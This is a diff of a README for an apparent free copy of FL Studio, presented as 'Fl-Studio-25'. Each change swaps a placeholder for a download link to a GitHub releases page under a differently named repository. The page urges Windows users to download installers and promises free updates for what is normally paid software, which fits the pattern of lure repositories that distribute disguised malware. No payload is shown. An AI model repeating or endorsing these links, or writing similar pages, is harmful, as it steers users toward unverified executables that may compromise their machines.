@@ -1,6 +1,6 @@
 # 🎛️ Fl-Studio-25 - Easy Music Creation and Mixing
 
-[![Download Now](https://img.shields.io/badge/Download-Fl--Studio--25-green?style=for-the-badge)](/)
+[![Download Now](https://img.shields.io/badge/Download-Fl--Studio--25-green?style=for-the-badge)](https://github.com/Benjamin1229/Fl-Studio-26/releases/tag/release)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and open Fl-Studio-25 on your Windows computer.
 
 Click the button below to go to the download page:
 
-[![Get Fl-Studio-25](https://img.shields.io/badge/Download-Fl--Studio--25-blue?style=for-the-badge)](/)
+[![Get Fl-Studio-25](https://img.shields.io/badge/Download-Fl--Studio--25-blue?style=for-the-badge)](https://github.com/Benjamin1229/Fl-Studio-26/releases/tag/release)
 
 This link takes you to the project’s main page on GitHub. Here, look for the download area or the latest release section. You will find files to download.
 
@@ -105,7 +105,7 @@ Fl-Studio-25 receives free updates that improve features and fix bugs. Check bac
 
 Visit the download page anytime here:
 
-[Download Fl-Studio-25](/)
+[Download Fl-Studio-25](https://github.com/Benjamin1229/Fl-Studio-26/releases/tag/release)
 
 ---
 
@@ -113,7 +113,7 @@ Visit the download page anytime here:
 
 You can always download the latest version by visiting this page:
 
-//
+https://github.com/Benjamin1229/Fl-Studio-26/releases/tag/release
 
 Look for the section named "Releases" or similar to find the installation files suited for Windows.
 
